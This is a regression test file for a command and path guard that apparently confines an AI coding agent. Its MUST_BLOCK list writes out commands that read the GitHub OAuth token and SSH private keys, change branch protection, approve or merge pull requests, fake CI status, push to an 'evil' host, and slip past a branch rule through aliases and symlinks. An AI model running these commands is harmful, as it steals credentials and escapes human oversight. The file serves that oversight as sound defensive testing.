// Regression tests for bypasses found in the security review of the guard.
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync } from "node:fs";
import { homedir } from "node:os";
import { describe, it } from "node:test";
import { DEFAULT_POLICY } from "../src/config.ts";
import { checkBash, checkPath } from "../src/guard.ts";

const policy = DEFAULT_POLICY;
const home = homedir();

const MUST_BLOCK = [
	// The GitHub token must not be readable through gh.
	"gh config get oauth_token -h github.com",
	"gh alias set m 'pr merge'",
	// Mutating or implicitly-POST gh api calls.
	"gh api repos/o/r/branches/main/protection --method=PUT --input x.json",
	"gh api repos/o/r/branches/main/protection --method=DELETE",
	"gh api repos/o/r/git/refs/heads/main --method=PATCH -f sha=abc",
	"gh api repos/o/r/rulesets --method=POST --input r.json",
	"gh api repos/o/r/issues -X POST",
	"gh api repos/o/r/statuses/abc -f state=success -f context=ci",
	"gh api repos/o/r/statuses/abc -F state=success",
	"gh api repos/o/r/issues --field title=x",
	"gh api repos/o/r/issues --raw-field title=x",
	"gh api repos/o/r/rulesets --input r.json",
	"gh api graphql -f query='mutation{mergePullRequest(input:{pullRequestId:\"x\"}){clientMutationId}}'",
	"gh api graphql",
	// Merging with global flags in front of the subcommand.
	"gh -R o/r pr merge 1",
	"gh --repo o/r pr merge 1",
	"gh pr review 1 --approve",
	"gh pr edit 1 --base x",
	// Secret directories reached by cd, relative paths, or substring.
	"cd ~/.config && cat pi-durable/env",
	"cd ~ && cat .config/pi-durable/env",
	"echo {} > pi-durable/policy.json",
	"cat .config/gh/hosts.yml",
	"cat ~/.ssh/id_rsa",
	"cd ~ && cat .ssh/id_rsa",
	"cat .local/share/pi-durable/audit.jsonl",
	"sqlite3 ~/.local/share/pi-durable/state.sqlite .dump",
	// git pushes and config that route around the pd/ branch rule.
	"git --work-tree=. push origin main",
	"git -c alias.p=push p origin main",
	"git config alias.p push",
	"git remote add x https://example.com/r.git",
	"git remote set-url origin https://example.com/r.git",
	"git push ssh://evil/r.git pd/x",
	"git push upstream pd/x",
	"git push origin pd/../main",
];

const MUST_ALLOW = [
	"gh api repos/o/r/pulls",
	"gh pr view 3",
	"gh pr checks 3",
	"git push -u origin pd/x",
	"git -C repo push -u origin pd/x",
	"cd ~/proj/pi-durable-local && git status",
];

describe("guard bypass regressions", () => {
	for (const command of MUST_BLOCK) {
		it(`blocks: ${command}`, () => {
			assert.notEqual(checkBash(command, policy), undefined, `expected a block for: ${command}`);
		});
	}
	for (const command of MUST_ALLOW) {
		it(`allows: ${command}`, () => {
			assert.equal(checkBash(command, policy), undefined);
		});
	}
});

describe("checkPath symlinks", () => {
	it("blocks writes through a symlink under ~/proj that points at a secret directory", () => {
		// A fresh machine (CI) may have neither ~/proj nor the config dir; make them, and remove only what we made.
		const made = [`${home}/proj`, `${home}/.config`, `${home}/.config/pi-durable`].filter((path) => !existsSync(path));
		for (const path of made) mkdirSync(path, { recursive: true });
		const dir = mkdtempSync(`${home}/proj/.guard-test-`);
		try {
			symlinkSync(`${home}/.config/pi-durable`, `${dir}/link`);
			assert.notEqual(checkPath("write", `${dir}/link/policy.json`, dir, policy), undefined);
			assert.notEqual(checkPath("edit", `${dir}/link/policy.json`, dir, policy), undefined);
			assert.notEqual(checkPath("read", `${dir}/link/env`, dir, policy), undefined);
		} finally {
			rmSync(dir, { recursive: true, force: true });
			for (const path of made.reverse()) rmSync(path, { recursive: true, force: true });
		}
	});
});
